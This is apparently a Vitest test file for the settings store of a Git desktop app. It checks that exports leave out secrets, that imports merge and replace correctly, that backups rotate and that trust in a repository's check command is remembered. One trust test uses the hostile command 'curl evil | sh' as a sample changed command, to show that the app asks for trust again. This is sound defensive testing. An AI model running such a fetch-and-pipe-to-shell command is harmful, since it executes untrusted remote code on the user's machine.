import { existsSync, readdirSync } from 'node:fs';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { Store } from '../../src/main/store';
import type { RepositoryInfo, SettingsExport } from '../../src/shared/types';

async function withStore(fn: (store: Store, dir: string) => void | Promise<void>): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), 'gg-settings-store-'));
  try {
    const store = new Store(dir);
    store.load();
    await fn(store, dir);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

const FORBIDDEN = ['hasApiKey', 'claudeCliPath', 'anthropicApiKey', '"gitPath"', '"ghPath"', 'gistId', '"window"'];

describe('Store.buildExport', () => {
  it('never includes a forbidden key even with every section selected and secrets configured', async () => {
    await withStore((store) => {
      store.updateSettings({ gitPath: '/usr/bin/git', ghPath: '/usr/bin/gh', ai: { ...store.getSettings().ai, hasApiKey: true, claudeCliPath: '/bin/claude' } });
      store.setApiKey('sk-ant-super-secret');
      const data = store.buildExport(['preferences', 'repositories', 'integrations'], [{ id: '1', path: '/repo', name: 'repo', alias: null, missing: false, github: null, lastOpened: 0, indicator: null, worktreeOf: null, parentRepoId: null }]);
      const json = JSON.stringify(data);
      for (const forbidden of FORBIDDEN) expect(json).not.toContain(forbidden);
      expect(json).not.toContain('sk-ant-super-secret');
      expect(json).not.toContain('/usr/bin/git');
      expect(json).not.toContain('/bin/claude');
    });
  });

  it('respects section selection', async () => {
    await withStore((store) => {
      const data = store.buildExport(['preferences'], []);
      expect(data.preferences).toBeTruthy();
      expect(data.repositories).toBeUndefined();
      expect(data.integrations).toBeUndefined();
    });
  });
});

describe('Store.previewImport / Store.importSettings', () => {
  it('merge only changes the requested field and keeps everything else', async () => {
    await withStore((store) => {
      store.updateSettings({ diffFontSize: 20 });
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' } };
      const settings = store.importSettings(file, 'merge', ['preferences']);
      expect(settings.theme).toBe('dark');
      expect(settings.diffFontSize).toBe(20);
    });
  });

  it('replace resets omitted preference fields to defaults and writes a backup', async () => {
    await withStore((store, dir) => {
      store.updateSettings({ diffFontSize: 20, theme: 'light' });
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' } };
      const settings = store.importSettings(file, 'replace', ['preferences']);
      expect(settings.theme).toBe('dark');
      expect(settings.diffFontSize).toBe(12); // DEFAULT_SETTINGS.diffFontSize
      const backups = readdirSync(dir).filter((f) => /^settings\.backup-.*\.json$/.test(f));
      expect(backups).toHaveLength(1);
    });
  });

  it('replace never touches non-portable fields such as gitPath or the stored API key flag', async () => {
    await withStore((store) => {
      store.updateSettings({ gitPath: '/usr/bin/git' });
      store.setApiKey('sk-ant-secret');
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' } };
      const settings = store.importSettings(file, 'replace', ['preferences']);
      expect(settings.gitPath).toBe('/usr/bin/git');
      expect(settings.ai.hasApiKey).toBe(true);
    });
  });

  it('keeps only the 5 most recent backups', async () => {
    await withStore((store, dir) => {
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' } };
      for (let i = 0; i < 7; i++) {
        store.importSettings(file, 'replace', ['preferences']);
      }
      const backups = readdirSync(dir).filter((f) => /^settings\.backup-.*\.json$/.test(f));
      expect(backups.length).toBeLessThanOrEqual(5);
    });
  });

  it('adds an imported repository with a missing path, marked missing, without removing existing repositories', async () => {
    await withStore((store) => {
      const existing: RepositoryInfo = { id: 'existing', path: '/already/here', name: 'here', alias: null, missing: false, github: null, lastOpened: 1, indicator: null, worktreeOf: null, parentRepoId: null };
      store.saveRepositories([existing]);
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, repositories: [{ path: '/does/not/exist/anywhere', alias: 'aliased', github: null }] };
      store.importSettings(file, 'merge', ['repositories']);
      const repos = store.getRepositories();
      expect(repos).toHaveLength(2);
      expect(repos.some((r) => r.id === 'existing')).toBe(true);
      const imported = repos.find((r) => r.path === '/does/not/exist/anywhere');
      expect(imported).toMatchObject({ alias: 'aliased', missing: true });
    });
  });

  it('skips a custom editor path exported from a different platform, with a warning', async () => {
    await withStore((store) => {
      const otherPlatform = process.platform === 'win32' ? 'linux' : 'win32';
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: otherPlatform, integrations: { externalEditor: 'custom', customEditorPath: '/some/other/platform/path' } };
      const preview = store.previewImport(file, []);
      expect(preview.warnings.some((w) => w.includes('customEditorPath'))).toBe(true);
      const settings = store.importSettings(file, 'merge', ['integrations']);
      expect(settings.customEditorPath).not.toBe('/some/other/platform/path');
    });
  });

  it('previewImport reports counts without applying any change', async () => {
    await withStore((store) => {
      const before = store.getSettings();
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' } };
      const preview = store.previewImport(file, store.getRepositories());
      expect(preview.sections).toEqual([{ name: 'preferences', adds: 0, changes: 1, skipped: 0 }]);
      expect(store.getSettings()).toEqual(before);
    });
  });

  it('throws for a file that is not a GitGood export, without writing a backup', async () => {
    await withStore((store, dir) => {
      expect(() => store.previewImport({ nope: true }, [])).toThrow();
      expect(() => store.importSettings({ nope: true }, 'replace', ['preferences'])).toThrow();
      const backups = readdirSync(dir).filter((f) => /^settings\.backup-.*\.json$/.test(f));
      expect(backups).toHaveLength(0);
    });
  });

  it('an unrelated section left out of `sections` is not applied even when present in the file', async () => {
    await withStore((store) => {
      store.saveRepositories([]);
      const file: SettingsExport = { schema: 1, app: 'gitgood', version: '1.0.0', exportedAt: '2026-01-01T00:00:00Z', platform: process.platform, preferences: { theme: 'dark' }, repositories: [{ path: '/should/not/be/added', alias: null, github: null }] };
      store.importSettings(file, 'merge', ['preferences']);
      expect(store.getRepositories()).toEqual([]);
    });
  });
});

describe('Store settings sync state', () => {
  it('round-trips the gist id and last-sync hash', async () => {
    await withStore((store) => {
      expect(store.getSettingsSync()).toEqual({ gistId: null, lastSyncedAt: null, lastHash: null });
      store.setSettingsSync({ gistId: 'abc123', lastSyncedAt: '2026-01-01T00:00:00Z', lastHash: 'h1' });
      expect(store.getSettingsSync()).toEqual({ gistId: 'abc123', lastSyncedAt: '2026-01-01T00:00:00Z', lastHash: 'h1' });
    });
  });

  it('is never present in a settings export', async () => {
    await withStore((store) => {
      store.setSettingsSync({ gistId: 'abc123', lastSyncedAt: '2026-01-01T00:00:00Z', lastHash: 'h1' });
      const data = store.buildExport(['preferences', 'repositories', 'integrations'], []);
      expect(JSON.stringify(data)).not.toContain('abc123');
    });
  });
});

describe('Store repository check-command trust', () => {
  it('is unknown (undefined) for a repository that has never been asked', async () => {
    await withStore((store) => {
      expect(store.getRepoConfigTrust('/repo')).toBeUndefined();
    });
  });

  it('persists a trust decision, keyed by repository path', async () => {
    await withStore((store, dir) => {
      store.setRepoConfigTrust('/repo/a', true);
      store.setRepoConfigTrust('/repo/b', false);
      expect(store.getRepoConfigTrust('/repo/a')).toBe(true);
      expect(store.getRepoConfigTrust('/repo/b')).toBe(false);
      expect(store.getRepoConfigTrust('/repo/c')).toBeUndefined();

      // Reload from disk to confirm it round-trips through state.json.
      const reloaded = new Store(dir);
      reloaded.load();
      expect(reloaded.getRepoConfigTrust('/repo/a')).toBe(true);
      expect(reloaded.getRepoConfigTrust('/repo/b')).toBe(false);
    });
  });

  it('a later decision overwrites an earlier one for the same repository', async () => {
    await withStore((store) => {
      store.setRepoConfigTrust('/repo', true);
      store.setRepoConfigTrust('/repo', false);
      expect(store.getRepoConfigTrust('/repo')).toBe(false);
    });
  });

  it('re-prompts when the repository changes its check command after trust was granted', async () => {
    await withStore((store, dir) => {
      store.setRepoConfigTrust('/repo', true, 'npm test');
      expect(store.getRepoConfigTrust('/repo', 'npm test')).toBe(true);
      expect(store.getRepoConfigTrust('/repo', 'curl evil | sh')).toBeUndefined();
      expect(store.getRepoConfigTrust('/repo')).toBe(true);
      const reloaded = new Store(dir);
      reloaded.load();
      expect(reloaded.getRepoConfigTrust('/repo', 'curl evil | sh')).toBeUndefined();
      expect(reloaded.getRepoConfigTrust('/repo', 'npm test')).toBe(true);
    });
  });
});

describe('Store.writeSettingsBackup file existence', () => {
  it('writes a readable JSON snapshot of the current settings', async () => {
    await withStore((store, dir) => {
      store.updateSettings({ theme: 'dark' });
      store.writeSettingsBackup();
      const backups = readdirSync(dir).filter((f) => /^settings\.backup-.*\.json$/.test(f));
      expect(backups).toHaveLength(1);
      expect(existsSync(join(dir, backups[0]))).toBe(true);
    });
  });
});
